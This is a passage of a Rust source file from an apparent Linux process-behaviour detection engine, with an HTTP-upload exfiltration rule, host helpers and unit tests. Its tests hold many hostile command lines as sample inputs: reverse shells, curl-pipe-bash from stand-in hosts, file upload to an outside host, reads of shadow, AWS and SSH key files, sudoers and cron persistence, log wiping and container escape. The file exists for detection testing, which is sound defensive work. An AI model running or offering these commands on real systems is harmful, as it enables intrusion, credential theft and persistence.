    }
    out
}

fn http_upload(base: &str, cmdline: &str, lower: &str) -> Option<DetectionData> {
    let curl = base == "curl"
        || lower
            .split_whitespace()
            .next()
            .is_some_and(|t| basename(t) == "curl")
        || lower.contains("| curl")
        || lower.contains("; curl")
        || lower.contains("&& curl")
        || lower.starts_with("curl ");
    let wget = base == "wget" || lower.contains("wget ");
    let toks: Vec<String> = cmdline.split_whitespace().map(unquote).collect();
    let mut file: Option<String> = None;
    for (i, t) in toks.iter().enumerate() {
        let next = toks.get(i + 1).cloned();
        if curl {
            match t.as_str() {
                "-T" | "--upload-file" => file = next,
                "-F" | "--form" => {
                    file = next.and_then(|v| v.split_once("=@").map(|(_, f)| f.to_string()))
                }
                "--data-binary" | "-d" | "--data" | "--data-raw" => {
                    file = next.and_then(|v| v.strip_prefix('@').map(String::from))
                }
                _ => {}
            }
        }
        if wget {
            if let Some(f) = t
                .strip_prefix("--post-file=")
                .or_else(|| t.strip_prefix("--body-file="))
            {
                file = Some(f.to_string());
            }
        }
        if file.is_some() {
            break;
        }
    }
    let file = file.filter(|f| !f.is_empty() && f != "-")?;
    let url = toks
        .iter()
        .find(|t| t.starts_with("http://") || t.starts_with("https://"));
    let (host, port) = url.map(|u| url_host_port(u)).unwrap_or((None, None));
    let internal = host.as_deref().is_some_and(is_internal_host);
    Some(DetectionData {
        rule_id: "exfil.http_upload".into(),
        title: "Local file uploaded over HTTP".into(),
        category: "exfiltration".into(),
        mitre_tactic: Some("TA0010 Exfiltration".into()),
        mitre_technique: Some("T1048.003".into()),
        confidence: 70,
        subject: file.clone(),
        detail: format!(
            "{base} uploads {file} to {}",
            host.clone().unwrap_or_else(|| "an unknown host".into())
        ),
        evidence: serde_json::json!({ "cmdline": cmdline, "path": file, "url": url }),
        // Uploads to loopback / private ranges are context, not exfiltration.
        mode: internal.then_some(DetectionMode::Signal),
        correlation: Some(CorrelationKeys {
            file_path: Some(file),
            ..remote_keys(host, port)
        }),
        ..Default::default()
    })
}

/// Host and port of a URL-ish token (`stratum+tcp://h:3333`, `http://h/x`).
fn url_host_port(url: &str) -> (Option<String>, Option<u16>) {
    let rest = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
    let authority = rest.split('/').next().unwrap_or(rest);
    let authority = authority.rsplit('@').next().unwrap_or(authority);
    if let Some(v6) = authority.strip_prefix('[') {
        let (h, p) = v6.split_once(']').unwrap_or((v6, ""));
        return (Some(h.to_string()), p.trim_start_matches(':').parse().ok());
    }
    match authority.rsplit_once(':') {
        Some((h, p)) => (Some(h.to_string()), p.parse().ok()),
        None if authority.is_empty() => (None, None),
        None => (Some(authority.to_string()), None),
    }
}

fn remote_keys(host: Option<String>, port: Option<u16>) -> CorrelationKeys {
    let is_ip = host
        .as_deref()
        .is_some_and(|h| h.parse::<std::net::IpAddr>().is_ok());
    CorrelationKeys {
        remote_ip: host.clone().filter(|_| is_ip),
        domain: host.filter(|_| !is_ip),
        remote_port: port,
        ..Default::default()
    }
}

/// Loopback, link-local, RFC1918 / ULA, or a bare intranet name.
pub fn is_internal_host(host: &str) -> bool {
    if host == "localhost" || !host.contains('.') && host.parse::<std::net::IpAddr>().is_err() {
        return true;
    }
    match host.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V4(v4)) => v4.is_loopback() || v4.is_private() || v4.is_link_local(),
        Ok(std::net::IpAddr::V6(v6)) => v6.is_loopback() || (v6.segments()[0] & 0xfe00) == 0xfc00,
        Err(_) => false,
    }
}

/// Return the final path component (works for both `/usr/bin/bash` and `bash`).
fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_dev_tcp_reverse_shell() {
        let d = inspect_process(
            "bash",
            "/usr/bin/bash",
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        )
        .unwrap();
        assert_eq!(d.category, "reverse_shell");
        assert_eq!(d.mitre_technique.as_deref(), Some("T1059.004"));
    }

    #[test]
    fn detects_python_socket_oneliner() {
        let cmd =
            "python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',9001))";
        let d = inspect_process("python3", "/usr/bin/python3", cmd).unwrap();
        assert_eq!(d.category, "reverse_shell");
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let d = inspect_process(
            "bash",
            "/usr/bin/bash",
            "bash -c curl http://evil/x.sh | bash",
        )
        .unwrap();
        assert_eq!(d.category, "lolbin");
    }

    #[test]
    fn download_into_shell_variants_are_detected() {
        for cmd in [
            "bash -c curl -s https://x/i.sh | sudo bash",
            "sh -c wget -qO- http://x/i.sh | sh -s -- --yes",
            "bash -c wget -O - http://x/a | bash",
            "bash -c eval \"$(curl -fsSL https://x/i)\"",
            "bash -c bash -c \"$(wget -qO- https://x/i)\"",
            "bash -c source <(curl -s https://x/env)",
            "bash -c curl https://x | /usr/bin/bash",
        ] {
            assert!(
                inspect_process("bash", "/usr/bin/bash", cmd)
                    .is_some_and(|d| d.rule_id == "lolbin.download_pipe_shell"),
                "{cmd}"
            );
        }
    }

    #[test]
    fn benign_compound_commands_are_not_download_pipe_shell() {
        // Regression from a recorded benign session: a downloader to a file,
        // unrelated pipes and an eval wrapper in the same command line.
        for cmd in [
            "/bin/bash -c source /root/.snap.sh && eval 'curl -s -o page.html https://example.com || true; ls | sort; sha256sum a | sha256sum -c'",
            "bash -c curl -o out.json https://api/x && cat out.json | jq .",
            "bash -c wget https://x/file.tgz && tar xzf file.tgz | sh_lint",
            "bash -c curl -s https://x | sha256sum",
            "bash -c curl -s https://x | shuf",
            "bash -c echo $(curl -s https://x/ip)",
        ] {
            assert!(
                inspect_process("bash", "/usr/bin/bash", cmd).is_none_or(|d| d.rule_id != "lolbin.download_pipe_shell"),
                "{cmd}"
            );
        }
    }

    #[test]
    fn detects_shadow_read() {
        let d = inspect_process("cat", "/usr/bin/cat", "cat /etc/shadow").unwrap();
        assert_eq!(d.category, "credential_access");
    }

    #[test]
    fn detects_memfd_exec() {
        let d = inspect_process("evil", "memfd:payload", "memfd:payload (deleted)").unwrap();
        assert_eq!(d.category, "fileless");
    }

    #[test]
    fn detects_aws_credential_access() {
        let d = inspect_process("cat", "/usr/bin/cat", "cat /home/u/.aws/credentials").unwrap();
        assert_eq!(d.category, "credential_access");
        assert_eq!(d.rule_id, "creds.secret_store_access");
    }

    #[test]
    fn detects_history_clear() {
        let d = inspect_process("history", "/usr/bin/history", "history -c").unwrap();
        assert_eq!(d.category, "defense_evasion");
    }

    #[test]
    fn detects_authorized_keys_persistence() {
        let d =
            inspect_process("tee", "/usr/bin/tee", "tee -a /root/.ssh/authorized_keys").unwrap();
        assert_eq!(d.category, "persistence");
    }

    #[test]
    fn detects_ld_preload_persistence() {
        let d = inspect_process("cp", "/usr/bin/cp", "cp evil.so /etc/ld.so.preload").unwrap();
        assert_eq!(d.rule_id, "persistence.ld_preload");
    }

    #[test]
    fn detects_gtfobin_find() {
        let d = inspect_process("find", "/usr/bin/find", "find . -exec /bin/sh \\; -quit").unwrap();
        assert_eq!(d.category, "privilege_escalation");
    }

    #[test]
    fn ignores_benign_commands() {
        assert!(inspect_process("ls", "/usr/bin/ls", "ls -la /home").is_none());
        assert!(inspect_process("bash", "/usr/bin/bash", "bash -c echo hello").is_none());
        assert!(inspect_process(
            "curl",
            "/usr/bin/curl",
            "curl https://example.com -o page.html"
        )
        .is_none());
        assert!(inspect_process("find", "/usr/bin/find", "find . -name '*.rs'").is_none());
        assert!(inspect_process("cat", "/usr/bin/cat", "cat README.md").is_none());
    }

    #[test]
    fn detects_ld_preload_injection() {
        let d = inspect_ld_preload("ls", "/usr/bin/ls", "LD_PRELOAD=/evil.so").unwrap();
        assert_eq!(d.rule_id, "injection.ld_preload");
        assert_eq!(d.category, "defense_evasion");
        assert_eq!(d.mitre_technique.as_deref(), Some("T1574.006"));
    }
    // ── Noise regressions ────────────────────────────────────────────────

    #[test]
    fn persistence_needs_a_write_target_not_a_mention() {
        // Reading or grepping an rc file is not persistence.
        assert!(inspect_process("grep", "/usr/bin/grep", "grep alias /root/.bashrc").is_none());
        assert!(inspect_process("cat", "/usr/bin/cat", "cat /etc/crontab").is_none());
        // `>>` to an unrelated file in a command that mentions a cron path.
        assert!(inspect_process(
            "bash",
            "/usr/bin/bash",
            "bash -c ls /etc/cron.d >> /tmp/listing.txt"
        )
        .is_none());
    }

    #[test]
    fn rc_file_append_is_only_a_signal_rule() {
        let d = inspect_process(
            "bash",
            "/usr/bin/bash",
            "bash -c echo alias ll=ls >> /home/u/.bashrc",
        )
        .unwrap();
        assert_eq!(d.rule_id, "persistence.rc_edit");
    }

    #[test]
    fn redirect_into_cron_is_persistence() {
        let d = inspect_process(
            "bash",
            "/usr/bin/bash",
            "bash -c echo '* * * * * root /tmp/x' > /etc/cron.d/x",
        )
        .unwrap();
        assert_eq!(d.rule_id, "persistence.cron_write");
        assert_eq!(d.base_severity, Some(Severity::High));
        let d = inspect_process("crontab", "/usr/bin/crontab", "crontab /tmp/jobs").unwrap();
        assert_eq!(d.base_severity, Some(Severity::Medium));
        assert!(inspect_process("crontab", "/usr/bin/crontab", "crontab -l").is_none());
    }

    #[test]
    fn write_targets_parse_redirects_and_writers() {
        assert_eq!(write_targets("bash", "echo x >> /a/b 2>&1"), vec!["/a/b"]);
        assert_eq!(
            write_targets("tee", "tee -a /etc/x /etc/y"),
            vec!["/etc/x", "/etc/y"]
        );
        assert_eq!(write_targets("cp", "cp -f src /etc/dst"), vec!["/etc/dst"]);
        assert_eq!(write_targets("dd", "dd if=/x of=/etc/y"), vec!["/etc/y"]);
        assert_eq!(
            write_targets("sed", "sed -i s/a/b/ /etc/sudoers"),
            vec!["/etc/sudoers"]
        );
        assert!(write_targets("sed", "sed s/a/b/ /etc/sudoers").is_empty());
        assert!(write_targets("bash", "cmd > /dev/null").is_empty());
    }

    #[test]
    fn sudoers_append_is_privesc() {
        let d = inspect_process(
            "bash",
            "/usr/bin/bash",
            "bash -c echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/u",
        )
        .unwrap();
        assert_eq!(d.rule_id, "privesc.sudoers_modify");
    }

    #[test]
    fn history_clear_is_a_signal_but_log_wipe_alerts() {
        assert_eq!(
            inspect_process("bash", "/usr/bin/bash", "bash -c history -c")
                .unwrap()
                .rule_id,
            "evasion.history_clear"
        );
        assert_eq!(
            inspect_process("rm", "/usr/bin/rm", "rm -f /var/log/auth.log")
                .unwrap()
                .rule_id,
            "evasion.log_or_history_clear"
        );
        // "-c" somewhere and the word "history" in a path is not a clear.
        assert!(inspect_process("gcc", "/usr/bin/gcc", "gcc -c history_util.c").is_none());
    }

    #[test]
    fn vim_needs_a_real_shell_escape_and_elevation() {
        assert!(inspect_process("vim", "/usr/bin/vim", "vim -c set ts=4 shell.txt").is_none());
        let user = ProcContext {
            uid: 1000,
            ancestor_comms: vec!["bash".into()],
            ..Default::default()
        };
        assert!(inspect_process_with("vim", "/usr/bin/vim", "vim -c :!sh", Some(&user)).is_none());
        let via_sudo = ProcContext {
            uid: 0,
            ancestor_comms: vec!["sudo".into(), "bash".into()],
            ..Default::default()
        };
        assert_eq!(
            inspect_process_with("vim", "/usr/bin/vim", "vim -c :!sh", Some(&via_sudo))
                .unwrap()
                .rule_id,
            "privesc.gtfobin"
        );
    }

    #[test]
    fn ssh_private_key_read_has_its_own_rule() {
        let d = inspect_process("cat", "/usr/bin/cat", "cat /home/u/.ssh/id_ed25519").unwrap();
        assert_eq!(d.rule_id, "creds.private_key_read");
        assert!(
            inspect_process("cat", "/usr/bin/cat", "cat /home/u/.ssh/id_ed25519.pub").is_none()
        );
    }

    #[test]
    fn trusted_ld_preload_is_low_confidence() {
        let trusted = inspect_ld_preload(
            "x",
            "/usr/bin/x",
            "/usr/lib/x86_64-linux-gnu/libjemalloc.so.2",
        )
        .unwrap();
        assert!(trusted.confidence < 50);
        let evil = inspect_ld_preload("x", "/usr/bin/x", "/tmp/evil.so").unwrap();
        assert!(evil.confidence >= 80);
    }

    // ── Context rules ────────────────────────────────────────────────────

    fn rules(comm: &str, exe: &str, cmd: &str, ctx: Option<&ProcContext>) -> Vec<String> {
        inspect_process_context(comm, exe, cmd, ctx)
            .into_iter()
            .map(|d| d.rule_id)
            .collect()
    }

    #[test]
    fn webserver_shell_by_lineage_or_account() {
        let under_nginx = ProcContext {
            ancestor_comms: vec!["php-fpm8.2".into(), "nginx".into()],
            username: "www-data".into(),
            ..Default::default()
        };
        assert!(rules("sh", "/bin/sh", "sh -c id", Some(&under_nginx))
            .contains(&"exec.webserver_shell".to_string()));
        let ide_terminal = ProcContext {
            ancestor_comms: vec!["node".into(), "code".into()],
            username: "dev".into(),
            ..Default::default()
        };
        assert!(rules("bash", "/bin/bash", "bash", Some(&ide_terminal)).is_empty());
    }

    #[test]
    fn base64_into_shell() {
        assert_eq!(
            rules(
                "bash",
                "/bin/bash",
                "bash -c echo ZWNobyBoaQ== | base64 -d | sh",
                None
            ),
            vec!["exec.b64_decode_exec"]
        );
        assert!(rules(
            "base64",
            "/usr/bin/base64",
            "base64 -d cert.b64 > cert.pem",
            None
        )
        .is_empty());
    }

    #[test]
    fn cryptominer_by_name_or_pool() {
        let d = inspect_process_context(
            "xmrig",
            "/tmp/.x/xmrig",
            "xmrig -o stratum+tcp://pool.example:3333 --donate-level 1",
            None,
        )
        .into_iter()
        .find(|d| d.rule_id == "impact.cryptominer")
        .unwrap();
        assert!(d.confidence >= 90);
        let c = d.correlation.unwrap();
        assert_eq!(c.domain.as_deref(), Some("pool.example"));
        assert_eq!(c.remote_port, Some(3333));
    }

    #[test]
    fn http_upload_to_internet_alerts_and_to_loopback_is_a_signal() {
        let ext = inspect_process_context(
            "curl",
            "/usr/bin/curl",
            "curl -s -T /dev/shm/a.tgz https://drop.example.net/up",
            None,
        );
        let d = ext
            .iter()
            .find(|d| d.rule_id == "exfil.http_upload")
            .unwrap();
        assert_eq!(d.mode, None);
        assert_eq!(
            d.correlation.as_ref().unwrap().file_path.as_deref(),
            Some("/dev/shm/a.tgz")
        );
        let lo = inspect_process_context(
            "curl",
            "/usr/bin/curl",
            "curl --upload-file /tmp/a http://127.0.0.1:9/",
            None,
        );
        let d = lo
            .iter()
            .find(|d| d.rule_id == "exfil.http_upload")
            .unwrap();
        assert_eq!(d.mode, Some(DetectionMode::Signal));
        assert!(rules(
            "curl",
            "/usr/bin/curl",
            "curl -o page.html https://example.com",
            None
        )
        .is_empty());
    }

    #[test]
    fn archive_staging_needs_sensitive_source_and_temp_target() {
        assert_eq!(
            rules(
                "tar",
                "/usr/bin/tar",
                "tar czf /dev/shm/x.tgz /home/u/.ssh",
                None
            ),
            vec!["collection.archive_staging"]
        );
        assert!(rules(
            "tar",
            "/usr/bin/tar",
            "tar czf /tmp/build.tgz ./target",
            None
        )
        .is_empty());
        assert!(rules(
            "tar",
            "/usr/bin/tar",
            "tar czf /backup/home.tgz /home/u",
            None
        )
        .is_empty());
    }

    #[test]
    fn container_escape_needs_container_for_ambiguous_primitives() {
        let in_container = ProcContext {
            container_id: Some("abc".into()),
            ..Default::default()
        };
        assert!(rules(
            "nsenter",
            "/usr/bin/nsenter",
            "nsenter -t 1 -m -u -n -i sh",
            None
        )
        .is_empty());
        assert_eq!(
            rules(
                "nsenter",
                "/usr/bin/nsenter",
                "nsenter -t 1 -m -u -n -i sh",
                Some(&in_container)
            ),
            vec!["container.escape_indicators"]
        );
        assert_eq!(
            rules(
                "sh",
                "/bin/sh",
                "sh -c echo /x > /sys/fs/cgroup/x/release_agent",
                None
            ),
            vec!["container.escape_indicators"]
        );
    }

    #[test]
    fn kernel_module_from_tmp() {
        assert_eq!(
            rules("insmod", "/usr/sbin/insmod", "insmod /tmp/rk.ko", None),
            vec!["defense.kmod_from_tmp"]
        );
        assert!(rules("modprobe", "/usr/sbin/modprobe", "modprobe nf_tables", None).is_empty());
    }

    #[test]
    fn proc_mem_read() {
        assert_eq!(
            rules(
                "dd",
                "/usr/bin/dd",
                "dd if=/proc/812/mem of=/tmp/m bs=1",
                None
            )
            .into_iter()
            .filter(|r| r == "creds.proc_mem_access")
            .count(),
            0,
            "dd if=… is an argument, not a bare path token"
        );
        assert_eq!(
            rules("cat", "/usr/bin/cat", "cat /proc/812/mem", None),
            vec!["creds.proc_mem_access"]
        );
        assert_eq!(
            rules("gcore", "/usr/bin/gcore", "gcore 812", None),
            vec!["creds.proc_mem_access"]
        );
    }

    #[test]
    fn temp_exec_is_reported() {
        assert_eq!(
            rules("x", "/tmp/x", "/tmp/x", None),
            vec!["defense.tmp_exec"]
        );
    }

    #[test]
    fn internal_hosts() {
        assert!(is_internal_host("127.0.0.1"));
        assert!(is_internal_host("10.1.2.3"));
        assert!(is_internal_host("localhost"));
        assert!(is_internal_host("fd00::1"));
        assert!(!is_internal_host("8.8.8.8"));
        assert!(!is_internal_host("example.com"));
    }
}
